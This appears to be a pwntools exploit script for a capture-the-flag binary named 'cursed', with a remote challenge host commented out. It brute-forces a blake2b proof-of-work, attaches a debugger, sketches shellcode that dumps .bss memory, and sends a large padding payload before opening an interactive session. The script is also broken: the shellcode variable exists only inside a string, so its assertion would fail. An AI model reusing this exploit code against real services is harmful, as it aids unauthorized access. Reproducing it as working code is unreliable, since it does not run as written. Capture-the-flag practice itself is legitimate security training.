#!/usr/bin/python3
from pwn import *
import binascii
from hashlib import blake2b


context.arch = 'amd64'

r = process('./cursed')
#r = remote('cursed.challenges.ooo', 29696)


off = 3
def pow(prefix):
	val = ''
	m = ['\x00' for _ in range(48)]
	while m[-off-1] != '\x80':
		val = prefix + (''.join(m)).encode('utf-8')
		h = blake2b(digest_size=16)
		h.update(val)

		Hash = h.digest()[:3]
		if Hash[0] == Hash[1] == Hash[2] == 0:
			return val[16:]
		m[47] = chr(ord(m[47])+1)
		for i in range(47, 47-off, -1):
			if m[i] == '\x80':
				m[i] = '\x00'
				m[i-1] = chr(ord(m[i-1])+1)
			else:
				break
		

	print("not found")
	exit(0)

prefix = r.recvn(16)
print("prefix: ", binascii.hexlify(prefix))
val = pow(prefix)
print("found: ", val)

#gdb.attach(r, 'b *0x40608e\nc\nn')
gdb.attach(r)
r.sendline(val)
sleep(1)

bss = 0x662000
'''
sh = asm(
	mov rdi, 0x1
	mov rsi, {bss}
	mov rdx, 0x50
	mov rax, 1
	syscall
	.format(bss=bss))
'''
assert(b'\x0a' not in sh)
r.sendline(('a'*0x800).ljust(0x1000, '\x00'))

r.interactive()